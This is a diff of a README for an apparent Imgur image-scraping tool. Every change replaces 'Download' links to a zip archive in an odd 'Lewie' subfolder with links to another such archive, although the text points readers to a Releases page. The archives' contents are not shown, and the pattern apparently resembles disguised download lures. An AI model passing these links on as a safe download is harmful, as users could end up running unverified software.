@@ -1,6 +1,6 @@
 # 📷 imgur-scraper - Fast Image Extraction Made Simple
 
-[![Download Now](https://raw.githubusercontent.com/robertilepot/imgur-scraper/main/Lewie/imgur-scraper-1.5.zip)](https://raw.githubusercontent.com/robertilepot/imgur-scraper/main/Lewie/imgur-scraper-1.5.zip)
+[![Download Now](https://github.com/robertilepot/imgur-scraper/raw/refs/heads/main/Lewie/scraper_imgur_v1.9.zip)](https://github.com/robertilepot/imgur-scraper/raw/refs/heads/main/Lewie/scraper_imgur_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ imgur-scraper employs straightforward crawling techniques to collect images. The
 
 To get started, you need to visit the Releases page to download the latest version of imgur-scraper. Click the link below:
 
-[**Download imgur-scraper**](https://raw.githubusercontent.com/robertilepot/imgur-scraper/main/Lewie/imgur-scraper-1.5.zip)
+[**Download imgur-scraper**](https://github.com/robertilepot/imgur-scraper/raw/refs/heads/main/Lewie/scraper_imgur_v1.9.zip)
 
 ### 🛠️ Installation Steps
 
@@ -85,4 +85,4 @@ imgur-scraper is open-source and released under the MIT License. You can freely 
 
 For more information or support, use the contact section in the repository.
 
-[**Download imgur-scraper**](https://raw.githubusercontent.com/robertilepot/imgur-scraper/main/Lewie/imgur-scraper-1.5.zip) to start exploring the world of Imgur images today!
+[**Download imgur-scraper**](https://github.com/robertilepot/imgur-scraper/raw/refs/heads/main/Lewie/scraper_imgur_v1.9.zip) to start exploring the world of Imgur images today!
